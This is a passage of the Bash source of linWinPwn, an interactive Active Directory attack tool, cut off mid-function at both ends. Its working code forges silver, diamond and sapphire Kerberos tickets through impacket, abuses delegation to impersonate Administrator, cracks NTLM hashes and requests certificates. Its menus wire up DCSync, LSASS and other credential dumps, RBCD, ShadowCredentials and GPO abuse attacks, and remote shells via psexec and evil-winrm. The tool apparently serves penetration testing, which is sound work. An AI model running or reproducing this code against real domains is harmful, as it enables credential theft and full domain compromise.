                        echo -e "${output_dir}/Credentials/${tick_randuser}_golden.kirbi"
                    else
                        echo -e "${RED}[-] Failed to generate golden ticket${NC}"
                    fi
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        kerberos_menu
        ;;

    11)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                tick_randuser="Administrator"
                tick_randuserid=""
                tick_spn="CIFS/${dc_domain}"
                tick_groups=""
                tick_servuser=""

                echo -e "Please specify name of SPN account (for example 'sql_svc'):"
                read -rp ">> " tick_servuser </dev/tty
                while [[ "${tick_servuser}" == "" ]]; do
                    echo -e "${RED}Invalid username.${NC} Please specify another:"
                    read -rp ">> " tick_servuser </dev/tty
                done

                echo -e "Please specify '1' for NTLM and '2' for AES:"
                read -rp ">> " ntlm_or_aes </dev/tty
                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
                    read -rp ">> " ntlm_or_aes </dev/tty
                done
                gethash_hash=""
                echo -e "Please specify the NTLM or AES hash of the SPN account (press Enter to extract hash from NTDS (requires DCSync rights):"
                read -rp ">> " gethash_hash </dev/tty
                if [[ ${gethash_hash} == "" ]]; then
                    gethash_user=$tick_servuser
                    get_hash
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                fi

                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi

                    echo -e "Please specify random user name (press Enter to choose default value 'Administrator'):"
                    read -rp ">> " tick_randuser_value </dev/tty
                    if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                    echo -e "Please specify the chosen user's ID (press Enter to choose default value EMPTY):"
                    read -rp ">> " tick_randuserid_value </dev/tty
                    if [[ ! "${tick_randuserid_value}" == "" ]]; then tick_randuserid="-user-id ${tick_randuserid_value}"; fi
                    echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
                    read -rp ">> " tick_spn_value </dev/tty
                    if [[ ! "${tick_spn_value}" == "" ]]; then tick_spn="${tick_spn_value}"; fi
                    while [[ "${sid_domain}" == "" ]]; do
                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                        read -rp ">> " sid_domain </dev/tty
                    done
                    echo -e "${CYAN}[*] Generating silver ticket for service $tick_spn_value...${NC}"
                    current_dir=$(pwd)
                    cd "${output_dir}/Credentials" || exit
                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuserid} ${tick_randuser}"
                    ticket_ccache_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').ccache"
                    ticket_kirbi_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').kirbi"
                    run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
                    /bin/mv "./${tick_randuser}.ccache" "./${ticket_ccache_out}" 2>/dev/null
                    /bin/mv "./${tick_randuser}.kirbi" "./${ticket_kirbi_out}" 2>/dev/null
                    cd "${current_dir}" || exit
                    if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
                        echo -e "${GREEN}[+] Silver ticket generated successfully:${NC}"
                        echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
                        echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
                    else
                        echo -e "${RED}[-] Failed to generate silver ticket${NC}"
                    fi
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        kerberos_menu
        ;;

    12)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                gethash_user="krbtgt"
                gethash_hash=""
                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
                read -rp ">> " gethash_hash </dev/tty
                if [[ ${gethash_hash} == "" ]]; then
                    get_hash
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                fi

                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                else
                    gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
                    tick_randuser="sql_svc"
                    tick_user_id="1337"
                    tick_groups="512,513,518,519,520"
                    echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
                    read -rp ">> " tick_randuser_value </dev/tty
                    if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                    echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
                    read -rp ">> " tick_user_id_value </dev/tty
                    if [[ ! "${tick_user_id_value}" == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
                    echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
                    read -rp ">> " tick_group_ids_value </dev/tty
                    if [[ ! "${tick_group_ids_value}" == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
                    while [[ "${sid_domain}" == "" ]]; do
                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                        read -rp ">> " sid_domain </dev/tty
                    done
                    echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
                    current_dir=$(pwd)
                    cd "${output_dir}/Credentials" || exit
                    run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
                    cd "${current_dir}" || exit
                    if [ -f "${output_dir}/Credentials/${tick_randuser}_diamond.ccache" ]; then
                        echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache"
                    else
                        echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
                    fi
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        kerberos_menu
        ;;

    13)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ]; then
                gethash_user="krbtgt"
                gethash_hash=""
                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
                read -rp ">> " gethash_hash </dev/tty
                if [[ ${gethash_hash} == "" ]]; then
                    get_hash
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                fi

                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                else
                    gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
                    tick_randuser="sql_svc"
                    tick_user_id="1337"
                    tick_groups="512,513,518,519,520"
                    tick_domain_admin="${user}"
                    echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
                    read -rp ">> " tick_randuser_value </dev/tty
                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                    echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
                    read -rp ">> " tick_user_id_value </dev/tty
                    if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
                    echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
                    read -rp ">> " tick_group_ids_value </dev/tty
                    if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
                    echo -e "Please specify domain admin to impersonate (press Enter to choose default value current user):"
                    read -rp ">> " tick_domain_admin_value </dev/tty
                    if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
                    while [[ "${sid_domain}" == "" ]]; do
                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                        read -rp ">> " sid_domain </dev/tty
                    done
                    echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
                    current_dir=$(pwd)
                    cd "${output_dir}/Credentials" || exit
                    run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
                    cd "${current_dir}" || exit
                    if [ -f "${output_dir}/Credentials/${tick_randuser}_sapphire.ccache" ]; then
                        echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache"
                    else
                        echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
                    fi
                fi
            else
                echo -e "${RED}[-] Error! Requires password...${NC}"
            fi
        fi
        kerberos_menu
        ;;

    14)
        raise_child
        kerberos_menu
        ;;

    15)
        if [ ! -f "${impacket_getST}" ]; then
            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                tick_randuser="Administrator"
                tick_spn="CIFS/${dc_domain}"
                tick_servuser=""

                echo -e "Please specify name of account with Delegation rights (for example 'gmsa'):"
                read -rp ">> " tick_servuser </dev/tty
                while [[ "${tick_servuser}" == "" ]]; do
                    echo -e "${RED}Invalid username.${NC} Please specify another:"
                    read -rp ">> " tick_servuser </dev/tty
                done

                echo -e "Please specify '1' for NTLM and '2' for AES:"
                read -rp ">> " ntlm_or_aes </dev/tty
                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
                    read -rp ">> " ntlm_or_aes </dev/tty
                done
                gethash_hash=""
                echo -e "Please specify the NTLM or AES hash of the delegation account (press Enter to extract hash from NTDS (requires DCSync rights):"
                read -rp ">> " gethash_hash </dev/tty
                if [[ ${gethash_hash} == "" ]]; then
                    gethash_user=$tick_servuser
                    get_hash
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                fi

                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-hashes :${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi

                    echo -e "Please specify user name of user to impersonate (press Enter to choose default value 'Administrator'):"
                    read -rp ">> " tick_randuser_value </dev/tty
                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                    echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
                    read -rp ">> " tick_spn_value </dev/tty
                    if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
                    echo -e "${CYAN}[*] Requesting ticket for service $tick_spn_value...${NC}"
                    current_dir=$(pwd)
                    cd "${output_dir}/Credentials" || exit
                    run_command "${impacket_getST} ${domain}/${tick_servuser} -spn ${tick_spn} ${gethash_key} -impersonate ${tick_randuser}"
                    ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                    ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                    run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
                    cd "${current_dir}" || exit
                    if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
                        echo -e "${GREEN}[+] Delegated ticket successfully requested :${NC}"
                        echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
                        echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
                    else
                        echo -e "${RED}[-] Failed to request ticket${NC}"
                    fi
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        kerberos_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        kerberos_menu
        ;;
    esac
}

shares_menu() {
    echo -e ""
    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) SMB SHARES SCANS #1-2-3-4"
    echo -e "m) Modify target(s)"
    echo -e "1) SMB shares Scan using smbmap"
    echo -e "2) SMB shares Enumeration using netexec"
    echo -e "3) SMB shares Spidering using netexec "
    echo -e "4) SMB shares Scan using FindUncommonShares"
    echo -e "5) SMB shares Scan using manspider"
    echo -e "6) Open smbclient.py console on target"
    echo -e "7) Open p0dalirius's smbclientng console on target"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        scan_shares
        shares_menu
        ;;

    m)
        modify_target
        shares_menu
        ;;

    1)
        smb_map
        shares_menu
        ;;

    2)
        ne_shares
        shares_menu
        ;;

    3)
        ne_spider
        shares_menu
        ;;

    4)
        finduncshar_scan
        shares_menu
        ;;

    5)
        manspider_scan
        shares_menu
        ;;

    6)
        smbclient_console
        shares_menu
        ;;

    7)
        smbclientng_console
        shares_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        shares_menu
        ;;
    esac

}

vulns_menu() {
    echo -e ""
    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) VULNERABILITY CHECKS #1-2-3-4-5-6-7-8-9-10-11-12"
    echo -e "m) Modify target(s)"
    echo -e "1) zerologon check using netexec (only on DC)"
    echo -e "2) MS17-010 check using netexec"
    echo -e "3) PetitPotam check using netexec (only on DC)"
    echo -e "4) dfscoerce check using netexec (only on DC)"
    echo -e "5) Print Spooler check using netexec"
    echo -e "6) Printnightmare check using netexec"
    echo -e "7) WebDAV check using netexec"
    echo -e "8) shadowcoerce check using netexec"
    echo -e "9) SMB signing check using netexec"
    echo -e "10) ntlmv1 check using netexec"
    echo -e "11) runasppl check using netexec"
    echo -e "12) RPC Dump and check for interesting protocols"
    echo -e "13) Coercer RPC scan"
    echo -e "14) PushSubscription abuse using PrivExchange"
    echo -e "15) RunFinger scan"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        vuln_checks
        vulns_menu
        ;;

    m)
        modify_target
        vulns_menu
        ;;

    1)
        zerologon_check
        vulns_menu
        ;;

    2)
        ms17-010_check
        vulns_menu
        ;;

    3)
        petitpotam_check
        vulns_menu
        ;;

    4)
        dfscoerce_check
        vulns_menu
        ;;

    5)
        spooler_check
        vulns_menu
        ;;

    6)
        printnightmare_check
        vulns_menu
        ;;

    7)
        webdav_check
        vulns_menu
        ;;

    8)
        shadowcoerce_check
        vulns_menu
        ;;

    9)
        smbsigning_check
        vulns_menu
        ;;

    10)
        ntlmv1_check
        vulns_menu
        ;;

    11)
        runasppl_check
        vulns_menu
        ;;

    12)
        rpcdump_check
        vulns_menu
        ;;

    13)
        coercer_check
        vulns_menu
        ;;

    14)
        privexchange_check
        vulns_menu
        ;;

    15)
        runfinger_check
        vulns_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        vulns_menu
        ;;
    esac
}

mssql_menu() {
    echo -e ""
    echo -e "${CYAN}[MSSQL Enumeration menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] MSSQL Enumeration requires credentials${NC}"
    else
        echo -e "A) MSSQL CHECKS #1-2"
        echo -e "1) MSSQL Enumeration using netexec"
        echo -e "2) MSSQL Relay check"
        echo -e "3) Open mssqlclient.py console on target"
    fi
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        mssql_checks
        mssql_menu
        ;;

    1)
        mssql_enum
        mssql_menu
        ;;

    2)
        mssql_relay_check
        mssql_menu
        ;;

    3)
        mssqlclient_console
        mssql_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        mssql_menu
        ;;
    esac
}

pwd_menu() {
    echo -e ""
    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] Password Dump requires credentials${NC}"
    else
        echo -e "A) PASSWORD DUMPS #1-2-4-12-13-16"
        echo -e "m) Modify target(s)"
        echo -e "1) LAPS Dump using netexec"
        echo -e "2) gMSA Dump using netexec"
        echo -e "3) DCSync using secretsdump (only on DC)"
        echo -e "4) Dump SAM and LSA using secretsdump"
        echo -e "5) Dump SAM and SYSTEM using reg"
        echo -e "6) Dump NTDS using netexec"
        echo -e "7) Dump SAM using netexec"
        echo -e "8) Dump LSA secrets using netexec"
        echo -e "9) Dump LSASS using lsassy"
        echo -e "10) Dump LSASS using handlekatz"
        echo -e "11) Dump LSASS using procdump"
        echo -e "12) Dump LSASS using nanodump"
        echo -e "13) Dump dpapi secrets using netexec"
        echo -e "14) Dump secrets using DonPAPI"
        echo -e "15) Dump secrets using hekatomb (only on DC)"
        echo -e "16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
        echo -e "17) Dump Veeam credentials (only from Veeam server)"
        echo -e "18) Dump Msol password (only from Azure AD-Connect server)"
        echo -e "19) Extract Bitlocker Keys"
    fi
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        pwd_dump
        pwd_menu
        ;;

    m)
        modify_target
        pwd_menu
        ;;

    1)
        laps_dump
        pwd_menu
        ;;

    2)
        gmsa_dump
        pwd_menu
        ;;

    3)
        secrets_dump_dcsync
        pwd_menu
        ;;

    4)
        secrets_dump
        pwd_menu
        ;;

    5)
        samsystem_dump
        pwd_menu
        ;;

    6)
        ntds_dump
        pwd_menu
        ;;

    7)
        sam_dump
        pwd_menu
        ;;

    8)
        lsa_dump
        pwd_menu
        ;;

    9)
        lsassy_dump
        pwd_menu
        ;;

    10)
        handlekatz_dump
        pwd_menu
        ;;

    11)
        procdump_dump
        pwd_menu
        ;;

    12)
        nanodump_dump
        pwd_menu
        ;;

    13)
        dpapi_dump
        pwd_menu
        ;;

    14)
        donpapi_dump
        pwd_menu
        ;;

    15)
        hekatomb_dump
        pwd_menu
        ;;

    16)
        juicycreds_dump
        pwd_menu
        ;;

    17)
        veeam_dump
        pwd_menu
        ;;

    18)
        msol_dump
        pwd_menu
        ;;

    19)
        bitlocker_dump
        pwd_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        pwd_menu
        ;;
    esac
}

modif_menu() {
    echo -e ""
    echo -e "${CYAN}[Modification menu]${NC} Please choose from the following options:"
    echo -e "-------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "m) Modify target(s)"
    echo -e "1) Change user or computer password (Requires: ForceChangePassword on user or computer)"
    echo -e "2) Add user to group (Requires: GenericWrite or GenericAll on group)"
    echo -e "3) Add new computer (Requires: MAQ > 0)"
    echo -e "4) Add new DNS entry"
    echo -e "5) Change Owner of target (Requires: WriteOwner permission)"
    echo -e "6) Add GenericAll rights on target (Requires: Owner permission)"
    echo -e "7) Targeted Kerberoast Attack (Noisy!)"
    echo -e "8) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
    echo -e "9) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
    echo -e "10) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
    echo -e "11) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
    echo -e "12) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
    echo -e "13) Add userPrincipalName to perform Kerberos impersonation (Requires: GenericWrite or GenericAll on user)"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        change_pass
        modif_menu
        ;;

    2)
        add_group_member
        modif_menu
        ;;

    3)
        add_computer
        modif_menu
        ;;

    4)
        dnsentry_add
        modif_menu
        ;;

    5)
        change_owner
        modif_menu
        ;;

    6)
        add_genericall
        modif_menu
        ;;

    7)
        targetedkerberoast_attack
        modif_menu
        ;;

    8)
        rbcd_attack
        modif_menu
        ;;

    9)
        shadowcreds_attack
        modif_menu
        ;;

    10)
        pygpo_abuse
        modif_menu
        ;;

    11)
        add_unconstrained
        modif_menu
        ;;

    12)
        add_spn
        modif_menu
        ;;

    13)
        add_upn
        main_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        modif_menu
        ;;
    esac
}

cmdexec_menu() {
    echo -e ""
    echo -e "${CYAN}[Command Execution menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------------"
    echo -e "1) Open CMD console using smbexec on target"
    echo -e "2) Open CMD console using wmiexec on target"
    echo -e "3) Open CMD console using psexec on target"
    echo -e "4) Open PowerShell console using evil-winrm on target"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        smbexec_console
        cmdexec_menu
        ;;

    2)
        wmiexec_console
        cmdexec_menu
        ;;

    3)
        psexec_console
        cmdexec_menu
        ;;

    4)
        evilwinrm_console
        cmdexec_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        cmdexec_menu
        ;;
    esac
}

init_menu() {
    echo -e ""
    echo -e "${YELLOW}[Init menu]${NC} Please choose from the following options:"
    echo -e "----------------------------------------------------"
    echo -e "ENTER) Launch linWinPwn in interactive mode"
    echo -e "A) Authentication Menu"
    echo -e "C) Configuration Menu"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    C)
        config_menu
        ;;

    A)
        auth_menu
        ;;

    "")
        dns_enum
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        init_menu
        ;;
    esac
}

auth_menu() {
    echo -e ""
    echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
    echo -e "----------------------------------------------------"
    echo -e "1) Generate NTLM hash of current user (requires: password) - Pass the hash"
    echo -e "2) Crack NTLM hash of current user (requires: NTLM hash)"
    echo -e "3) Generate TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
    echo -e "4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
    echo -e "5) Request certificate (requires: authentication)"
    echo -e "back) Go back to Init Menu"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    C)
        config_menu
        ;;

    A)
        auth_menu
        ;;

    1)
        if [ "${pass_bool}" == true ]; then
            hash_gen="$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$password") | $(which openssl) dgst -md4 | cut -d " " -f 2)"
            echo -e "${GREEN}[+] NTLM hash generated:${NC} $hash_gen"
            echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -H ${hash_gen}"
        else
            echo -e "${RED}[-] Error! Requires password...${NC}"
        fi
        auth_menu
        ;;

    2)
        if [ ! -f "${john}" ]; then
            echo -e "${RED}[-] Please verify the installation of john${NC}"
        else
            if [ "${hash_bool}" == true ]; then
                echo "$hash" | cut -d ":" -f 2 >"${output_dir}/Credentials/ntlm_hash"
                echo -e "${CYAN}[*] Cracking NTLM hash using john the ripper${NC}"
                run_command "$john ${output_dir}/Credentials/ntlm_hash --format=NT --wordlist=$pass_wordlist" | tee "${output_dir}/Credentials/johnNTLM_output_${dc_domain}"
                john_out=$($john "${output_dir}/Credentials/ntlm_hash" --format=NT --show)
                if [[ "${john_out}" == *"1 password"* ]]; then
                    password_cracked=$(echo "$john_out" | cut -d ":" -f 2 | cut -d " " -f 1)
                    echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked"
                    echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -p ${password_cracked}"
                else
                    echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires NTLM hash...${NC}"
            fi
        fi
        auth_menu
        ;;

    3)
        if [ ! -f "${impacket_getTGT}" ]; then
            echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                current_dir=$(pwd)
                cd "${output_dir}/Credentials" || exit
                echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
                run_command "${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
                cd "${current_dir}" || exit
                if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
                    krb_ticket="${output_dir}/Credentials/${user}.ccache"
                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
                    echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -K ${krb_ticket}"
                else
                    echo -e "${RED}[-] Failed to generate TGT${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
            fi
        fi
        auth_menu
        ;;

    4)
        if [[ ! -f "${certipy}" ]]; then
            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
        else
            if [[ ${cert_bool} == false ]]; then
                echo -e "Please specify location of certificate file:"
                read -rp ">> " pfxcert </dev/tty
                while [ ! -s "${pfxcert}" ]; do
                    echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
                    read -rp ">> " pfxcert </dev/tty
                done
                if [[ ${pfxpass} == "" ]]; then
                    echo -e "Please specify password of certificate file (press Enter if no password):"
                    read -rp ">> " pfxpass </dev/tty
                fi
            fi
            echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
            pkinit_auth
        fi
        echo -e ""
        auth_menu
        ;;

    5)
        if [[ ! -f "${certipy}" ]]; then
            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${kerb_bool}" == true ]; then
                ne_adcs_enum
                current_dir=$(pwd)
                cd "${output_dir}/Credentials" || exit
                i=0
                for pki_server in $pki_servers; do
                    i=$((i + 1))
                    pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
                done
                cd "${current_dir}" || exit
                if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
                    pfxcert="${output_dir}/Credentials/${user}.pfx"
                    pfxpass=""
                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
                    $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
                    if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
                        pem_cert="${output_dir}/Credentials/${user}.pem"
                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${pem_cert}"
                    fi
